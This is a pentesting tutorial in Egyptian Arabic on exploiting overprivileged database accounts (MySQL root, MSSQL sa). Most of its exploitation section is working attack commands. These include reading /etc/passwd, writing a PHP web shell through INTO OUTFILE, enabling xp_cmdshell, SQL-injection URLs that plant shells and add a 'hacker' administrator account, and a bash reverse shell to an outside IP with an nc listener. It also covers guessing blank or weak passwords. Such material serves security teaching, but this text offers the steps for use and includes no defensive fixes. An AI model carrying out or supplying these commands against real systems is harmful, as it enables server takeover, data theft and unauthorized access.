# **1. إيه هو Overprivileged Database Users (root, sa)؟**

## **الشرح العميق:**
"Overprivileged Database Users" يعني إن مستخدمين قاعدة البيانات (زي "root" في MySQL أو "sa" في MSSQL) عندهم صلاحيات زيادة عن اللازم، يعني بيسمحوله يعملوا أكتر مما المفروض يحتاجوه لشغلهم. في العادي، المستخدمين دول بيكونوا Admins لقاعدة البيانات، لكن المشكلة لما يتسابوا مفتوحين أو يتستخدموا في تطبيقات الويب من غير ما يتحددوا صلاحياتهم صح.

- **root (في MySQL/PostgreSQL):** المستخدم الافتراضي بتاع قاعدة البيانات في لينكس، عنده كل الصلاحيات: يشوف، يعدل، يمسح، وينفذ أوامر على النظام لو السيرفر مضبوط غلط.
- **sa (في MSSQL):** المستخدم الافتراضي في Microsoft SQL Server، بيديه تحكم كامل في قاعدة البيانات، وممكن ينفذ أوامر على النظام لو مفعل XP_CMDSHELL.

لو التطبيق بيتصل بقاعدة البيانات باستخدام المستخدمين دول بدون قيود، المهاجم لو لقى ثغرة (زي SQL Injection) يقدر يستغلهم عشان يتحكم في كل حاجة.

## طرق اكتشافها :
### 1. **فحص مستخدم MySQL:**
   - لو وصلت لـ Shell:
     -  `mysql -u root -p` ->  مفتوح root لو دخلت من غير كلمة سر، يبقى  .
   -  `SHOW GRANTS;` ->    يعني صلاحيات مفتوحة.`GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' WITH GRANT OPTION` لو رجع،

### 2. **فحص مستخدم sa في MSSQL:**
   - `sqlcmd -S 192.168.1.10 -U sa -P ""`.
   - لو دخلت، شغل:
     -ء `SELECT IS_SRVROLEMEMBER('sysadmin', 'sa');` -> لو رجع `1`، يعني sa هو الأدمن.

### 3. **فحص من الويب:**
   - لو لقيت config.php مكشوف:
     - ء `cat /var/www/html/config.php` -> `$db_user = "root"; $db_pass = "";`.

## **خلاصة بالعامية المصرية:**
"يعني زي ما تكون سايب البواب بتاع العمارة يتحكم في كل الأدوار بدل ما يفتح الباب بس! root وsa دول زي الباشا بتاع قاعدة البيانات، لو مسكتهم، بقيت الكبير بتاع كل حاجة."

---

# **2. ليه المشكلة دي خطيرة؟**

## **الشرح العميق:**
المستخدمين دول خطيرين لأنهم بيدوك التحكم الكامل في قاعدة البيانات، وأحيانًا في السيرفر نفسه لو فيه إعدادات ضعيفة. لو المهاجم قدر يوصلهم:
- **سرقة بيانات:** يشوف كل الجداول (زي بيانات العملاء أو كلمات السر).
- **تعديل أو تدمير:** يمسح قاعدة البيانات أو يغير فيها.
- **تصعيد صلاحيات:** ينفذ أوامر على النظام (زي كتابة ملفات أو فتح Shell).

في الـ Pentesting، لو لقيت إن التطبيق بيستخدم root أو sa بصلاحيات مفتوحة، ده بيكون كنز لأنه بيفتحلك كل الأبواب.

## طرق استغلالها لو لقتها :
### 1. **استغلال root في MySQL:**
   - لو وصلت لـ MySQL كـ root:
     -  ء`SELECT LOAD_FILE('/etc/passwd');` -> لو نجح، يعني تقدر تقرا ملفات النظام.
     -  ء` SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';` -> تكتب Shell.

### 2. **استغلال sa في MSSQL:**
   - لو وصلت كـ sa:
     - `EXEC sp_configure 'show advanced options', 1; RECONFIGURE;`.
     - `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`.
     - `EXEC xp_cmdshell 'whoami';` ->   يبقى سيطرت على السيرفر nt authority\system لو رجع `،

### 3. **SQL Injection للوصول:**
   - لو موقع فيه ثغرة:
     - `http://target.com/user?id=1; SELECT USER(); --` ->root.  يبقى التطبيق بيستخدم`root@localhost`لو رجع 

## **خلاصة بالعامية المصرية:**
"المستخدمين دول زي ما تكون سايب مفتاح العربية لأي حد، لو مسكوه، هياخدوا العربية كلها! خطيرين لأنهم بيدوك كل حاجة، من البيانات لحد السيرفر نفسه."

---

# **3. إزاي نستغلها في الـ Pentesting؟**
- **الهدف:** تستخدم الصلاحيات الزيادة دي عشان تاخد وصول أعلى أو تتحكم في النظام كله.
- **مثال واقعي:** لو لقيت إن تطبيق ويب بيستخدم root في MySQL، تقدر تكتب ملف Shell وتتصل بالسيرفر.

## **خلاصة بالعامية المصرية:**
"لما تلاقي root أو sa مفتوحين، زي ما تكون لقيت مفتاح السكة الحديد! بتستغلهم عشان تفتح كل الأبواب وتبقى الكبير بتاع اللعبة."

---

# **خطوات عملية للاستغلال في Pentesting**

## **الخطوة 1: فحص الهدف**
- شغل Nmap:
  - `nmap -sV 192.168.1.10`.
- افترض النتيجة:
  - Port 3306: MySQL 5.7 (لينكس).
  - Port 1433: MSSQL (ويندوز).

## **الخطوة 2: البحث عن الوصول**
- في لينكس:
  - `mysql -u root -p -h 192.168.1.10` -> "root" جرب بدون كلمة سر أو.
- في ويندوز:
  - `sqlcmd -S 192.168.1.10 -U sa -P "sa"` -> "admin" جرب كلمات سر ضعيفة زي .

## **الخطوة 3: استغلال عبر الويب**
- لو موقع فيه SQL Injection:
  - `http://192.168.1.10/user?id=1; SELECT USER(); --`.
  - لو رجع `root@localhost` أو `sa`:
    - MySQL: `http://192.168.1.10/user?id=1; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'; --`.
    -  MSSQL: `http://192.168.1.10/user?id=1; EXEC xp_cmdshell 'net user hacker pass123 /add'; --`.

## **الخطوة 4: التحقق والتصعيد**
- في MySQL:
  - افتح: `http://192.168.1.10/shell.php?cmd=id` -> لو رجع `www-data`:
    - `http://192.168.1.10/shell.php?cmd=/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1`.
    - `nc -lvnp 4444` -> Shell.
- في MSSQL:
  - لو نجح الأمر، ادخل كـ `hacker` وشوف:
    -  ء`whoami` -> لو `system`، نجحت.

## **الخطوة 5: تصعيد كامل**
- في لينكس:
  - من الـ Shell: `id` -> `www-data` -> `sudo -l` -> لو لقيت شيء، استغله.
- في ويندوز:
  -  `net localgroup administrators hacker /add` -> تصعد لأدمن.

## **الخطوة 6: توثيق**
- سجل إنك لقيت root/sa مفتوحين.
- قدم تقرير يوضح إزاي استخدمتهم للوصول للنظام.

## **خلاصة بالعامية المصرية:**
"الخطوات دي زي ما تكون لقيت مفتاح القصر، فتحته، لعبته فيه، وطلعت الكبير بتاع الحتة! root وsa لما يكونوا مفتوحين، يبقوا طريقك للنصر في اللعبة."

---

# **الخلاصة النهائية:**
Overprivileged Database Users زي root وsa هما ثغرة كبيرة لأنهم بيدوك تحكم كامل في قاعدة البيانات وأحيانًا السيرفر. في الـ Pentesting، دور عليهم في الإعدادات أو استغلهم من ثغرات زي SQL Injection، واستخدمهم عشان تاخد Shell أو تصعد صلاحياتك. وري العميل إن النظام بتاعه زي بيت من غير حراس لو سيب المستخدمين دول مفتوحين! بالأدوات دي، تبقى البطل بتاع الساحة!